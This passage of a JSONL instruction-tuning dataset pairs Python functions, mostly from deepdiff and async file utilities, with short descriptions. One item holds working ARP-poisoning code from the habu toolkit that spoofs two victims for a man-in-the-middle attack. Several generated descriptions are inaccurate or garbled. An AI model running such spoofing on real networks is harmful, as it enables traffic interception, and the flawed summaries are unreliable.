np.float64)):\n                    continue\n                for key in par_keys.get(par, [par]):\n                    df.loc[:, key] = df.loc[:, key].astype(dtype)\n\n    elif pars:\n        par_keys = dict()\n        if not fnames_set.issuperset(pars_set):\n            par_keys = OrderedDict([(par, []) for par in fit.sim['pars_oi']])\n            for key in fit.sim['fnames_oi']:\n                par = key.split(\"[\")\n                par = par[0]\n                par_keys[par].append(key)\n\n        columns = []\n        for par in pars:\n            columns.extend(par_keys.get(par, [par]))\n        columns = list(np.unique(columns))\n\n        df = pd.DataFrame(index=np.arange(sum(n_kept)), columns=columns, dtype=float)\n        for key in columns:\n            key_values = []\n            for chain, (pyholder, n) in enumerate(zip(fit.sim['samples'], n_kept)):\n                key_values.append(pyholder.chains[key][-n:])\n            df.loc[:, key] = np.concatenate(key_values)\n\n        for par, dtype in dtypes.items():\n            if isinstance(dtype, (float, np.float64)):\n                continue\n            for key in par_keys.get(par, [par]):\n                df.loc[:, key] = df.loc[:, key].astype(dtype)\n    else:\n        df = pd.DataFrame()\n\n    if diagnostics:\n        diagnostics_dfs = []\n        for idx, (pyholder, permutation, n) in enumerate(zip(fit.sim['samples'], fit.sim['permutation'], n_kept), 1):\n            diagnostics_df = pd.DataFrame(pyholder['sampler_params'], index=pyholder['sampler_param_names']).T\n            diagnostics_df = diagnostics_df.iloc[-n:, :]\n            for key, dtype in diagnostic_type.items():\n                if key in diagnostics_df:\n                    diagnostics_df.loc[:, key] = diagnostics_df.loc[:, key].astype(dtype)\n            diagnostics_dfs.append(diagnostics_df)\n        if diagnostics_dfs:\n            diagnostics_df = pd.concat(diagnostics_dfs, axis=0, sort=False, ignore_index=True)\n        else:\n            diagnostics_df = pd.DataFrame()\n    else:\n        diagnostics_df = pd.DataFrame()\n\n    df = pd.concat((header_df, df, diagnostics_df), axis=1, sort=False)\n    if permuted:\n        df.sort_values(by='permutation_order', inplace=True)\n        if not header:\n            df.drop(columns='permutation_order', inplace=True)\n    return df"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads the module named module_name from module_path independently of the Python version.", "response": "def load_module(module_name, module_path):\n    \"\"\"Load the module named `module_name` from  `module_path`\n    independently of the Python version.\"\"\"\n    if sys.version_info >= (3,0):\n        import pyximport\n        pyximport.install()\n        sys.path.append(module_path)\n        return __import__(module_name)\n    else:\n        import imp\n        module_info = imp.find_module(module_name, [module_path])\n        return imp.load_module(module_name, *module_info)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _map_parallel(function, args, n_jobs):\n    # Following the error checking found in joblib\n    multiprocessing = int(os.environ.get('JOBLIB_MULTIPROCESSING', 1)) or None\n    if multiprocessing:\n        try:\n            import multiprocessing\n            import multiprocessing.pool\n        except ImportError:\n            multiprocessing = None\n        if sys.platform.startswith(\"win\") and PY2:\n            msg = \"Multiprocessing is not supported on Windows with Python 2.X. Setting n_jobs=1\"\n            logger.warning(msg)\n            n_jobs = 1\n    # 2nd stage: validate that locking is available on the system and\n    #            issue a warning if not\n    if multiprocessing:\n        try:\n            _sem = multiprocessing.Semaphore()\n            del _sem  # cleanup\n        except (ImportError, OSError) as e:\n            multiprocessing = None\n            logger.warning('{}. _map_parallel will operate in serial mode'.format(e))\n    if multiprocessing and int(n_jobs) not in (0, 1):\n        if n_jobs == -1:\n            n_jobs = None\n        try:\n            pool = multiprocessing.Pool(processes=n_jobs)\n            map_result = pool.map(function, args)\n        finally:\n            pool.close()\n            pool.join()\n    else:\n        map_result = list(map(function, args))\n    return map_result", "response": "A parallel version of map that supports multiprocessing and multiprocessing."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nopens an asyncio file.", "response": "def _open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None,\n          closefd=True, opener=None, *, loop=None, executor=None):\n    \"\"\"Open an asyncio file.\"\"\"\n    if loop is None:\n        loop = asyncio.get_event_loop()\n    cb = partial(sync_open, file, mode=mode, buffering=buffering,\n                 encoding=encoding, errors=errors, newline=newline,\n                 closefd=closefd, opener=opener)\n    f = yield from loop.run_in_executor(executor, cb)\n\n    return wrap(f, loop=loop, executor=executor)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the results based on the view", "response": "def _get_view_results(self, view):\n        \"\"\"\n        Get the results based on the view\n        \"\"\"\n        if view == TREE_VIEW:\n            result = self.tree\n        else:\n            result = TextResult(tree_results=self.tree)\n            result.cleanup()  # clean up text-style result dictionary\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __report_result(self, report_type, level):\n        if not self.__skip_this(level):\n            level.report_type = report_type\n            self.tree[report_type].add(level)", "response": "Add a detected change to the reference - style result dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef __skip_this(self, level):\n        skip = False\n        if self.exclude_paths and level.path() in self.exclude_paths:\n            skip = True\n        elif self.exclude_regex_paths and any(\n                [exclude_regex_path.search(level.path()) for exclude_regex_path in self.exclude_regex_paths]):\n            skip = True\n        else:\n            if self.exclude_types_tuple and (isinstance(level.t1, self.exclude_types_tuple) or\n                                             isinstance(level.t2, self.exclude_types_tuple)):\n                skip = True\n\n        return skip", "response": "Check whether this comparison should be skipped because one of the objects to compare meets exclusion criteria."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef __diff_dict(self,\n                    level,\n                    parents_ids=frozenset({}),\n                    print_as_attribute=False,\n                    override=False,\n                    override_t1=None,\n                    override_t2=None):\n        \"\"\"Difference of 2 dictionaries\"\"\"\n        if override:\n            # for special stuff like custom objects and named tuples we receive preprocessed t1 and t2\n            # but must not spoil the chain (=level) with it\n            t1 = override_t1\n            t2 = override_t2\n        else:\n            t1 = level.t1\n            t2 = level.t2\n\n        if print_as_attribute:\n            item_added_key = \"attribute_added\"\n            item_removed_key = \"attribute_removed\"\n            rel_class = AttributeRelationship\n        else:\n            item_added_key = \"dictionary_item_added\"\n            item_removed_key = \"dictionary_item_removed\"\n            rel_class = DictRelationship\n\n        t1_keys = set(t1.keys())\n        t2_keys = set(t2.keys())\n        if self.ignore_string_type_changes or self.ignore_numeric_type_changes:\n            t1_clean_to_keys = self.__get_clean_to_keys_mapping(keys=t1_keys, level=level)\n            t2_clean_to_keys = self.__get_clean_to_keys_mapping(keys=t2_keys, level=level)\n            t1_keys = set(t1_clean_to_keys.keys())\n            t2_keys = set(t2_clean_to_keys.keys())\n        else:\n            t1_clean_to_keys = t2_clean_to_keys = None\n\n        t_keys_intersect = t2_keys.intersection(t1_keys)\n\n        t_keys_added = t2_keys - t_keys_intersect\n        t_keys_removed = t1_keys - t_keys_intersect\n\n        for key in t_keys_added:\n            key = t2_clean_to_keys[key] if t2_clean_to_keys else key\n            change_level = level.branch_deeper(\n                notpresent,\n                t2[key],\n                child_relationship_class=rel_class,\n                child_relationship_param=key)\n            self.__report_result(item_added_key, change_level)\n\n        for key in t_keys_removed:\n            key = t1_clean_to_keys[key] if t1_clean_to_keys else key\n            change_level = level.branch_deeper(\n                t1[key],\n                notpresent,\n                child_relationship_class=rel_class,\n                child_relationship_param=key)\n            self.__report_result(item_removed_key, change_level)\n\n        for key in t_keys_intersect:  # key present in both dicts - need to compare values\n            key1 = t1_clean_to_keys[key] if t1_clean_to_keys else key\n            key2 = t2_clean_to_keys[key] if t2_clean_to_keys else key\n            item_id = id(t1[key1])\n            if parents_ids and item_id in parents_ids:\n                continue\n            parents_ids_added = add_to_frozen_set(parents_ids, item_id)\n\n            # Go one level deeper\n            next_level = level.branch_deeper(\n                t1[key1],\n                t2[key2],\n                child_relationship_class=rel_class,\n                child_relationship_param=key)\n            self.__diff(next_level, parents_ids_added)", "response": "Difference of two dictionaries."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomparing strings and add a diff to the level", "response": "def __diff_str(self, level):\n        \"\"\"Compare strings\"\"\"\n        if self.ignore_string_case:\n            level.t1 = level.t1.lower()\n            level.t2 = level.t2.lower()\n\n        if type(level.t1) == type(level.t2) and level.t1 == level.t2:\n            return\n\n        # do we add a diff for convenience?\n        do_diff = True\n        t1_str = level.t1\n        t2_str = level.t2\n\n        if isinstance(level.t1, bytes_type):\n            try:\n                t1_str = level.t1.decode('ascii')\n            except UnicodeDecodeError:\n                do_diff = False\n\n        if isinstance(level.t2, bytes_type):\n            try:\n                t2_str = level.t2.decode('ascii')\n            except UnicodeDecodeError:\n                do_diff = False\n\n        if t1_str == t2_str:\n            return\n\n        if do_diff:\n            if '\\n' in t1_str or '\\n' in t2_str:\n                diff = difflib.unified_diff(\n                    t1_str.splitlines(), t2_str.splitlines(), lineterm='')\n                diff = list(diff)\n                if diff:\n                    level.additional['diff'] = '\\n'.join(diff)\n\n        self.__report_result('values_changed', level)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef __create_hashtable(self, t, level):\n\n        hashes = {}\n        for (i, item) in enumerate(t):\n            try:\n                hashes_all = DeepHash(item,\n                                      hashes=self.hashes,\n                                      exclude_types=self.exclude_types,\n                                      exclude_paths=self.exclude_paths,\n                                      exclude_regex_paths=self.exclude_regex_paths,\n                                      hasher=self.hasher,\n                                      ignore_repetition=not self.report_repetition,\n                                      significant_digits=self.significant_digits,\n                                      number_format_notation=self.number_format_notation,\n                                      ignore_string_type_changes=self.ignore_string_type_changes,\n                                      ignore_numeric_type_changes=self.ignore_numeric_type_changes,\n                                      ignore_type_in_groups=self.ignore_type_in_groups,\n                                      ignore_type_subclasses=self.ignore_type_subclasses,\n                                      ignore_string_case=self.ignore_string_case,\n                                      number_to_string_func=self.number_to_string,\n                                      )\n                item_hash = hashes_all[item]\n            except Exception as e:  # pragma: no cover\n                logger.warning(\"Can not produce a hash for %s.\"\n                               \"Not counting this object.\\n %s\" %\n                               (level.path(), e))\n            else:\n                if item_hash is unprocessed:  # pragma: no cover\n                    logger.warning(\"Item %s was not processed while hashing \"\n                                   \"thus not counting this object.\" %\n                                   level.path())\n                else:\n                    self._add_hash(hashes=hashes, item_hash=item_hash, item=item, i=i)\n        return hashes", "response": "Create a hashtable of all objects in t."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef __diff_numbers(self, level):\n        t1_type = \"number\" if self.ignore_numeric_type_changes else level.t1.__class__.__name__\n        t2_type = \"number\" if self.ignore_numeric_type_changes else level.t2.__class__.__name__\n\n        if self.significant_digits is None:\n            if level.t1 != level.t2:\n                self.__report_result('values_changed', level)\n        else:\n            # Bernhard10: I use string formatting for comparison, to be consistent with usecases where\n            # data is read from files that were previousely written from python and\n            # to be consistent with on-screen representation of numbers.\n            # Other options would be abs(t1-t2)<10**-self.significant_digits\n            # or math.is_close (python3.5+)\n            # Note that abs(3.25-3.251) = 0.0009999999999998899 < 0.001\n            # Note also that \"{:.3f}\".format(1.1135) = 1.113, but \"{:.3f}\".format(1.11351) = 1.114\n            # For Decimals, format seems to round 2.5 to 2 and 3.5 to 4 (to closest even number)\n            t1_s = self.number_to_string(level.t1,\n                                         significant_digits=self.significant_digits,\n                                         number_format_notation=self.number_format_notation)\n            t2_s = self.number_to_string(level.t2,\n                                         significant_digits=self.significant_digits,\n                                         number_format_notation=self.number_format_notation)\n\n            t1_s = KEY_TO_VAL_STR.format(t1_type, t1_s)\n            t2_s = KEY_TO_VAL_STR.format(t2_type, t2_s)\n            if t1_s != t2_s:\n                self.__report_result('values_changed', level)", "response": "Diff Numbers of two level objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef __diff(self, level, parents_ids=frozenset({})):\n        if level.t1 is level.t2:\n            return\n\n        if self.__skip_this(level):\n            return\n\n        if get_type(level.t1) != get_type(level.t2):\n            report_type_change = True\n            for type_group in self.ignore_type_in_groups:\n                if self.type_check_func(level.t1, type_group) and self.type_check_func(level.t2, type_group):\n                    report_type_change = False\n                    break\n            if report_type_change:\n                self.__diff_types(level)\n                return\n\n        if isinstance(level.t1, strings):\n            self.__diff_str(level)\n\n        elif isinstance(level.t1, numbers):\n            self.__diff_numbers(level)\n\n        elif isinstance(level.t1, Mapping):\n            self.__diff_dict(level, parents_ids)\n\n        elif isinstance(level.t1, tuple):\n            self.__diff_tuple(level, parents_ids)\n\n        elif isinstance(level.t1, (set, frozenset, OrderedSet)):\n            self.__diff_set(level)\n\n        elif isinstance(level.t1, Iterable):\n            if self.ignore_order:\n                self.__diff_iterable_with_deephash(level)\n            else:\n                self.__diff_iterable(level, parents_ids)\n\n        else:\n            self.__diff_obj(level, parents_ids)", "response": "The main diff method."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef to_json(self, default_mapping=None):\n        return json.dumps(self.to_dict(), default=json_convertor_default(default_mapping=default_mapping))", "response": "Dump the object to json."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef to_dict(self):\n        if self.view == TREE_VIEW:\n            result = dict(self._get_view_results(view=TEXT_VIEW))\n        else:\n            result = dict(self)\n        return result", "response": "Dump dictionary of the current text view."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cleanup(self):\n        empty_keys = [k for k, v in self.items() if not v]\n\n        for k in empty_keys:\n            del self[k]", "response": "Remove empty keys from this object. Should always be called after the result is final."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npopulating this object by parsing an existing reference - style result dictionary.", "response": "def _from_tree_results(self, tree):\n        \"\"\"\n        Populate this object by parsing an existing reference-style result dictionary.\n        :param tree: A TreeResult\n        :return:\n        \"\"\"\n        self._from_tree_type_changes(tree)\n        self._from_tree_default(tree, 'dictionary_item_added')\n        self._from_tree_default(tree, 'dictionary_item_removed')\n        self._from_tree_value_changed(tree)\n        self._from_tree_unprocessed(tree)\n        self._from_tree_default(tree, 'iterable_item_added')\n        self._from_tree_default(tree, 'iterable_item_removed')\n        self._from_tree_default(tree, 'attribute_added')\n        self._from_tree_default(tree, 'attribute_removed')\n        self._from_tree_set_item_removed(tree)\n        self._from_tree_set_item_added(tree)\n        self._from_tree_repetition_change(tree)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef auto_generate_child_rel(self, klass, param):\n        if self.down.t1 is not notpresent:\n            self.t1_child_rel = ChildRelationship.create(\n                klass=klass, parent=self.t1, child=self.down.t1, param=param)\n        if self.down.t2 is not notpresent:\n            self.t2_child_rel = ChildRelationship.create(\n                klass=klass, parent=self.t2, child=self.down.t2, param=param)", "response": "Auto - populate self. child_rel1 and self. child_rel2."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the root object of this comparison.", "response": "def all_up(self):\n        \"\"\"\n        Get the root object of this comparison.\n        (This is a convenient wrapper for following the up attribute as often as you can.)\n        :rtype: DiffLevel\n        \"\"\"\n        level = self\n        while level.up:\n            level = level.up\n        return level"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the leaf object of this comparison.", "response": "def all_down(self):\n        \"\"\"\n        Get the leaf object of this comparison.\n        (This is a convenient wrapper for following the down attribute as often as you can.)\n        :rtype: DiffLevel\n        \"\"\"\n        level = self\n        while level.down:\n            level = level.down\n        return level"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the path of the object at the given level.", "response": "def path(self, root=\"root\", force=None):\n        \"\"\"\n        A python syntax string describing how to descend to this level, assuming the top level object is called root.\n        Returns None if the path is not representable as a string.\n        This might be the case for example if there are sets involved (because then there's not path at all) or because\n        custom objects used as dictionary keys (then there is a path but it's not representable).\n        Example: root['ingredients'][0]\n        Note: We will follow the left side of the comparison branch, i.e. using the t1's to build the path.\n        Using t1 or t2 should make no difference at all, except for the last step of a child-added/removed relationship.\n        If it does in any other case, your comparison path is corrupt.\n        :param root: The result string shall start with this var name\n        :param force: Bends the meaning of \"no string representation\".\n                      If None:\n                        Will strictly return Python-parsable expressions. The result those yield will compare\n                        equal to the objects in question.\n                      If 'yes':\n                        Will return a path including '(unrepresentable)' in place of non string-representable parts.\n                      If 'fake':\n                        Will try to produce an output optimized for readability.\n                        This will pretend all iterables are subscriptable, for example.\n        \"\"\"\n        # TODO: We could optimize this by building on top of self.up's path if it is cached there\n        if force in self._path:\n            result = self._path[force]\n            return None if result is None else \"{}{}\".format(root, result)\n\n        result = \"\"\n        level = self.all_up  # start at the root\n\n        # traverse all levels of this relationship\n        while level and level is not self:\n            # get this level's relationship object\n            next_rel = level.t1_child_rel or level.t2_child_rel  # next relationship object to get a formatted param from\n\n            # t1 and t2 both are empty\n            if next_rel is None:\n                break\n\n            # Build path for this level\n            item = next_rel.get_param_repr(force)\n            if item:\n                result += item\n            else:\n                # it seems this path is not representable as a string\n                result = None\n                break\n\n            # Prepare processing next level\n            level = level.down\n\n        self._path[force] = result\n        result = None if result is None else \"{}{}\".format(root, result)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_deeper(self,\n                      new_t1,\n                      new_t2,\n                      child_relationship_class,\n                      child_relationship_param=None,\n                      report_type=None):\n        \"\"\"\n        Start a new comparison level and correctly link it to this one.\n        :rtype: DiffLevel\n        :return: New level\n        \"\"\"\n        level = self.all_down\n        result = DiffLevel(\n            new_t1, new_t2, down=None, up=level, report_type=report_type)\n        level.down = result\n        level.auto_generate_child_rel(\n            klass=child_relationship_class, param=child_relationship_param)\n        return result", "response": "Create a new level that is a deep link between two entries."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new branch level that is just one level deeper.", "response": "def branch_deeper(self,\n                      new_t1,\n                      new_t2,\n                      child_relationship_class,\n                      child_relationship_param=None,\n                      report_type=None):\n        \"\"\"\n        Branch this comparison: Do not touch this comparison line, but create a new one with exactly the same content,\n        just one level deeper.\n        :rtype: DiffLevel\n        :return: New level in new comparison line\n        \"\"\"\n        branch = self.copy()\n        return branch.create_deeper(new_t1, new_t2, child_relationship_class,\n                                    child_relationship_param, report_type)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef copy(self):\n        orig = self.all_up\n        result = copy(orig)  # copy top level\n\n        while orig is not None:\n            result.additional = copy(orig.additional)\n\n            if orig.down is not None:  # copy and create references to the following level\n                # copy following level\n                result.down = copy(orig.down)\n\n                if orig.t1_child_rel is not None:\n                    result.t1_child_rel = ChildRelationship.create(\n                        klass=orig.t1_child_rel.__class__,\n                        parent=result.t1,\n                        child=result.down.t1,\n                        param=orig.t1_child_rel.param)\n                if orig.t2_child_rel is not None:\n                    result.t2_child_rel = ChildRelationship.create(\n                        klass=orig.t2_child_rel.__class__,\n                        parent=result.t2,\n                        child=result.down.t2,\n                        param=orig.t2_child_rel.param)\n\n            # descend to next level\n            orig = orig.down\n            if result.down is not None:\n                result = result.down\n        return result", "response": "Get a deep copy of this comparision line."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts a parameter to a string.", "response": "def stringify_param(self, force=None):\n        \"\"\"\n        Convert param to a string. Return None if there is no string representation.\n        This is called by get_param_repr()\n        :param force: Bends the meaning of \"no string representation\".\n                      If None:\n                        Will strictly return Python-parsable expressions. The result those yield will compare\n                        equal to the objects in question.\n                      If 'yes':\n                        Will return '(unrepresentable)' instead of None if there is no string representation\n        \"\"\"\n        param = self.param\n        if isinstance(param, strings):\n            result = param if self.quote_str is None else self.quote_str.format(param)\n        else:\n            candidate = str(param)\n            try:\n                resurrected = literal_eval(candidate)\n                # Note: This will miss string-representable custom objects.\n                # However, the only alternative I can currently think of is using eval() which is inherently dangerous.\n            except (SyntaxError, ValueError):\n                result = None\n            else:\n                result = candidate if resurrected == param else None\n\n        if result:\n            result = ':' if self.param_repr_format is None else self.param_repr_format.format(result)\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef short_repr(item, max_length=15):\n    item = repr(item)\n    if len(item) > max_length:\n        item = '{}...{}'.format(item[:max_length - 3], item[-1])\n    return item", "response": "Short representation of item if it is too long"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert a number into a string considering significant digits.", "response": "def number_to_string(number, significant_digits, number_format_notation=\"f\"):\n    \"\"\"\n    Convert numbers to string considering significant digits.\n    \"\"\"\n    try:\n        using = number_formatting[number_format_notation]\n    except KeyError:\n        raise ValueError(\"number_format_notation got invalid value of {}. The valid values are 'f' and 'e'\".format(number_format_notation)) from None\n    if isinstance(number, Decimal):\n        tup = number.as_tuple()\n        with localcontext() as ctx:\n            ctx.prec = len(tup.digits) + tup.exponent + significant_digits\n            number = number.quantize(Decimal('0.' + '0' * significant_digits))\n    result = (using % significant_digits).format(number)\n    # Special case for 0: \"-0.00\" should compare equal to \"0.00\"\n    if set(result) <= ZERO_DECIMAL_CHARACTERS:\n        result = \"0.00\"\n    # https://bugs.python.org/issue36622\n    if number_format_notation == 'e' and isinstance(number, float):\n        result = result.replace('+0', '+')\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef prepare_string_for_hashing(obj, ignore_string_type_changes=False, ignore_string_case=False):\n    original_type = obj.__class__.__name__\n    if isinstance(obj, bytes):\n        obj = obj.decode('utf-8')\n    if not ignore_string_type_changes:\n        obj = KEY_TO_VAL_STR.format(original_type, obj)\n    if ignore_string_case:\n        obj = obj.lower()\n    return obj", "response": "Prepare a string for hashing."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsearching the object in the database.", "response": "def __search_obj(self,\n                     obj,\n                     item,\n                     parent,\n                     parents_ids=frozenset({}),\n                     is_namedtuple=False):\n        \"\"\"Search objects\"\"\"\n        found = False\n        if obj == item:\n            found = True\n            # We report the match but also continue inside the match to see if there are\n            # furthur matches inside the `looped` object.\n            self.__report(report_key='matched_values', key=parent, value=obj)\n\n        try:\n            if is_namedtuple:\n                obj = obj._asdict()\n            else:\n                # Skip magic methods. Slightly hacky, but unless people are defining\n                # new magic methods they want to search, it should work fine.\n                obj = {i: getattr(obj, i) for i in dir(obj)\n                       if not (i.startswith('__') and i.endswith('__'))}\n        except AttributeError:\n            try:\n                obj = {i: getattr(obj, i) for i in obj.__slots__}\n            except AttributeError:\n                if not found:\n                    self['unprocessed'].append(\"%s\" % parent)\n\n                return\n\n        self.__search_dict(\n            obj, item, parent, parents_ids, print_as_attribute=True)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef __search_dict(self,\n                      obj,\n                      item,\n                      parent,\n                      parents_ids=frozenset({}),\n                      print_as_attribute=False):\n        \"\"\"Search dictionaries\"\"\"\n        if print_as_attribute:\n            parent_text = \"%s.%s\"\n        else:\n            parent_text = \"%s[%s]\"\n\n        obj_keys = set(obj.keys())\n\n        for item_key in obj_keys:\n            if not print_as_attribute and isinstance(item_key, strings):\n                item_key_str = \"'%s'\" % item_key\n            else:\n                item_key_str = item_key\n\n            obj_child = obj[item_key]\n\n            item_id = id(obj_child)\n\n            if parents_ids and item_id in parents_ids:\n                continue\n\n            parents_ids_added = add_to_frozen_set(parents_ids, item_id)\n\n            new_parent = parent_text % (parent, item_key_str)\n            new_parent_cased = new_parent if self.case_sensitive else new_parent.lower()\n\n            str_item = str(item)\n            if (self.match_string and str_item == new_parent_cased) or\\\n               (not self.match_string and str_item in new_parent_cased):\n                self.__report(\n                    report_key='matched_paths',\n                    key=new_parent,\n                    value=obj_child)\n\n            self.__search(\n                obj_child,\n                item,\n                parent=new_parent,\n                parents_ids=parents_ids_added)", "response": "Search the dictionary for the item and parent."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsearch iterables except dictionaries sets and strings.", "response": "def __search_iterable(self,\n                          obj,\n                          item,\n                          parent=\"root\",\n                          parents_ids=frozenset({})):\n        \"\"\"Search iterables except dictionaries, sets and strings.\"\"\"\n\n        for i, thing in enumerate(obj):\n            new_parent = \"%s[%s]\" % (parent, i)\n            if self.__skip_this(thing, parent=new_parent):\n                continue\n\n            if self.case_sensitive or not isinstance(thing, strings):\n                thing_cased = thing\n            else:\n                thing_cased = thing.lower()\n\n            if thing_cased == item:\n                self.__report(\n                    report_key='matched_values', key=new_parent, value=thing)\n            else:\n                item_id = id(thing)\n                if parents_ids and item_id in parents_ids:\n                    continue\n                parents_ids_added = add_to_frozen_set(parents_ids, item_id)\n                self.__search(thing, item, \"%s[%s]\" %\n                              (parent, i), parents_ids_added)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomparing strings and report if match_string is set", "response": "def __search_str(self, obj, item, parent):\n        \"\"\"Compare strings\"\"\"\n        obj_text = obj if self.case_sensitive else obj.lower()\n\n        if (self.match_string and item == obj_text) or (not self.match_string and item in obj_text):\n            self.__report(report_key='matched_values', key=parent, value=obj)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __search(self, obj, item, parent=\"root\", parents_ids=frozenset({})):\n\n        if self.__skip_this(item, parent):\n            return\n\n        elif isinstance(obj, strings) and isinstance(item, strings):\n            self.__search_str(obj, item, parent)\n\n        elif isinstance(obj, strings) and isinstance(item, numbers):\n            return\n\n        elif isinstance(obj, numbers):\n            self.__search_numbers(obj, item, parent)\n\n        elif isinstance(obj, MutableMapping):\n            self.__search_dict(obj, item, parent, parents_ids)\n\n        elif isinstance(obj, tuple):\n            self.__search_tuple(obj, item, parent, parents_ids)\n\n        elif isinstance(obj, (set, frozenset)):\n            if self.warning_num < 10:\n                logger.warning(\n                    \"Set item detected in the path.\"\n                    \"'set' objects do NOT support indexing. But DeepSearch will still report a path.\"\n                )\n                self.warning_num += 1\n            self.__search_iterable(obj, item, parent, parents_ids)\n\n        elif isinstance(obj, Iterable):\n            self.__search_iterable(obj, item, parent, parents_ids)\n\n        else:\n            self.__search_obj(obj, item, parent, parents_ids)", "response": "The main search method."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_arp_poison(victim1, victim2, iface, verbose):\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    mac1 = getmacbyip(victim1)\n    mac2 = getmacbyip(victim2)\n\n    pkt1 = Ether(dst=mac1)/ARP(op=\"is-at\", psrc=victim2, pdst=victim1, hwdst=mac1)\n    pkt2 = Ether(dst=mac2)/ARP(op=\"is-at\", psrc=victim1, pdst=victim2, hwdst=mac2)\n\n    try:\n        while 1:\n            sendp(pkt1)\n            sendp(pkt2)\n\n            if verbose:\n                pkt1.show2()\n                pkt2.show2()\n            else:\n                print(pkt1.summary())\n                print(pkt2.summary())\n\n            time.sleep(1)\n\n    except KeyboardInterrupt:\n        pass", "response": "Send ARP is - at packets to each victim and then send them to the system."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nretrieving all HTTP headers from a node", "response": "def get_headers(server):\n    \"\"\"Retrieve all HTTP headers\"\"\"\n    try:\n        response = requests.head(\n            server, allow_redirects=False, verify=False, timeout=5)\n    except requests.exceptions.ConnectionError:\n        return False\n\n    return dict(response.headers)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_options(server):\n    try:\n        response = requests.options(\n            server, allow_redirects=False, verify=False, timeout=5)\n    except (requests.exceptions.ConnectionError,\n            requests.exceptions.MissingSchema):\n        return \"Server {} is not available!\".format(server)\n\n    try:\n        return {'allowed': response.headers['Allow']}\n    except KeyError:\n        return \"Unable to get HTTP methods\"", "response": "Retrieve the available HTTP verbs"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cmd_ping(ip, interface, count, timeout, wait, verbose):\n\n    if interface:\n        conf.iface = interface\n\n    conf.verb = False\n    conf.L3socket=L3RawSocket\n\n    layer3 = IP()\n    layer3.dst = ip\n    layer3.tos = 0\n    layer3.id = 1\n    layer3.flags = 0\n    layer3.frag = 0\n    layer3.ttl = 64\n    layer3.proto = 1 # icmp\n\n    layer4 = ICMP()\n    layer4.type = 8 # echo-request\n    layer4.code = 0\n    layer4.id = 0\n    layer4.seq = 0\n\n    pkt = layer3 / layer4\n\n    counter = 0\n\n    while True:\n        ans = sr1(pkt, timeout=timeout)\n        if ans:\n            if verbose:\n                ans.show()\n            else:\n                print(ans.summary())\n            del(ans)\n        else:\n            print('Timeout')\n\n        counter += 1\n\n        if count != 0 and counter == count:\n            break\n\n        sleep(wait)\n\n    return True", "response": "This command is used to send ICMP echo requests to the Habu ICMP server."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncollect information about the host where habu is running.", "response": "def cmd_host(verbose):\n    \"\"\"Collect information about the host where habu is running.\n\n    Example:\n\n    \\b\n    $ habu.host\n    {\n        \"kernel\": [\n            \"Linux\",\n            \"demo123\",\n            \"5.0.6-200.fc29.x86_64\",\n            \"#1 SMP Wed Apr 3 15:09:51 UTC 2019\",\n            \"x86_64\",\n            \"x86_64\"\n        ],\n        \"distribution\": [\n            \"Fedora\",\n            \"29\",\n            \"Twenty Nine\"\n        ],\n        \"libc\": [\n            \"glibc\",\n            \"2.2.5\"\n        ],\n        \"arch\": \"x86_64\",\n        \"python_version\": \"3.7.3\",\n        \"os_name\": \"Linux\",\n        \"cpu\": \"x86_64\",\n        \"static_hostname\": \"demo123\",\n        \"fqdn\": \"demo123.lab.sierra\"\n    }\n    \"\"\"\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n        print(\"Gather information about the host...\", file=sys.stderr)\n\n    result = gather_details()\n\n    if result:\n        print(json.dumps(result, indent=4))\n    else:\n        print(\"[X] Unable to gather information\")\n\n    return True"}
